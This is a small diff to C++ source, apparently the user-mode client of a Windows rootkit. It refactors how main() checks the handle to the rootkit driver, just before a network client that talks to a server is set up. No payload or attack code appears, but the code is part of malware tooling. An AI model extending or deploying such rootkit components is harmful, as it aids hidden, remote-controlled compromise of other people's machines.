@@ -11,7 +11,7 @@ int main(int argc, const char* argv[]) {
 	//rootkit_handler: interacts with rootkit driver
 	Driver::DriverHandler rootkit_handler;
 
-	if (rootkit_handler.hDevice == INVALID_HANDLE_VALUE)
+	if (rootkit_handler.device_handle() == INVALID_HANDLE_VALUE)
 		return logError("couldn't open a handle");
 
 	//network_client: interacts with the server.
